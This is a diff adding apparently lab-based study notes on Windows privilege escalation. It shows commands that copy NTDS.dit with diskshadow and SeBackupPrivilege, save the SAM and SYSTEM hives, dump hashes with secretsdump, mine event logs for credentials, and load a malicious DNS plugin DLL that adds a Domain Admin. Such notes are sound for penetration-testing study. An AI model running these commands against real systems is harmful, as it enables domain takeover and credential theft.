@@ -193,3 +193,156 @@ Let's check if `SeBackupPrivilege` is enabled by invoking `whoami /priv` or�
 >[!info]
 >Based on the server's settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.
 
+```powershell-session
+whoami /priv
+Set-SeBackupPrivilege
+Get-SeBackupPrivilege
+
+```
+to copy the file use :
+```powershell-session
+ Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
+```
+As the `NTDS.dit` file is locked by default, we can use the Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to create a shadow copy of the `C` drive and expose it as `E` drive. The NTDS.dit in this shadow copy won't be in use by the system.
+
+```powershell-session
+PS C:\htb> diskshadow.exe
+
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC,  10/14/2020 12:57:52 AM
+
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context clientaccessible
+DISKSHADOW> set context persistent
+DISKSHADOW> begin backup
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> end backup
+DISKSHADOW> exit
+
+PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+```
+
+The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`
+
+```cmd-session
+reg save HKLM\SYSTEM SYSTEM.SAV
+reg save HKLM\SAM SAM.SAV
+```
+
+Using secretsdump from impackets
+```shell-session
+secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+```
+
+The built-in utility [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) can be used to copy files in backup mode as well
+
+```cmd-session
+robocopy /B E:\Windows\NTDS .\ntds ntds.dit
+```
+even better, so we won't use external tools 
+
+### Event log readers
+
+When belonging to this group, we are able to read the logs, We can query Windows events from the command line using the [wevtutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) utility and the [Get-WinEvent](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.1) PowerShell cmdlet.
+
+```powershell-session
+wevtutil qe Security /rd:true /f:text | Select-String "/user"
+```
+
+We can also specify alternate credentials for `wevtutil` using the parameters `/u` and `/p`.
+```cmd-session
+wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
+```
+
+using get-WinEvent
+```powershell-session
+Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
+```
+
+### DnsAdmins
+Members of the [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins) group have access to DNS information on the network, seems interesting =) 
+The DNS service runs as an administrator, so it's possible to inject DLLs, and here's how it works:
+- DNS management is performed over RPC
+- [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the `dnscmd` tool from the command line
+- When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
+- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
+- An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.
+- 
+let's go through the attack 
+1. Create a payload with msfvenom `msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll`
+2. Transfer it to the victim's machine, with http server and wget
+3. use dnscmd to load the DLL,
+	- `dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll`
+	-  if it's not a privileged user, this cannot be done, and we'll expect an error, verify using `Get-ADGroupMember -Identity DnsAdmins` 
+After restarting the DNS service (if our user has this level of access), we should be able to run our custom DLL and add a user (in our case) or get a reverse shell. If we do not have access to restart the DNS server, we will have to wait until the server or service restarts.
+1. Find the user's SID 
+	- `wmic useraccount where name="netadm" get sid`
+2.  if all goes as planned, we'll have our user in domain admins group
+	- `net group "Domain Admins" /dom`
+
+>[!warning]
+As good and nice future pentester, revoking the steps is necessary, as these are destructive actions.
+
+The first step is confirming that the `ServerLevelPluginDll` registry key exists. Until our custom DLL is removed, we will not be able to start the DNS service again correctly.
+```cmd-session
+C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
+    EnableGlobalQueryBlockList    REG_DWORD    0x1
+    PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL
+    Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
+    ForwardingTimeout    REG_DWORD    0x3
+    IsSlave    REG_DWORD    0x0
+    BootMethod    REG_DWORD    0x3
+    AdminConfigured    REG_DWORD    0x1
+    ServerLevelPluginDll    REG_SZ    adduser.dll
+```
+#### Deleting Registry Key
+We can use the `reg delete` command to remove the key that points to our custom DLL.
+
+```cmd-session
+C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
+
+Delete the registry value ServerLevelPluginDll (Yes/No)? Y
+The operation completed successfully.
+```
+
+#### Starting the DNS Service Again
+
+Once this is done, we can start up the DNS service again.
+```cmd-session
+C:\htb> sc.exe start dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 4984
+        FLAGS              :
+```
+
+#### Checking DNS Service Status
+
+If everything went to plan, querying the DNS service will show that it is running. We can also confirm that DNS is working correctly within the environment by performing an `nslookup` against the localhost or another host in the domain.
+```cmd-session
+C:\htb> sc query dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 4  RUNNING
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+```
+
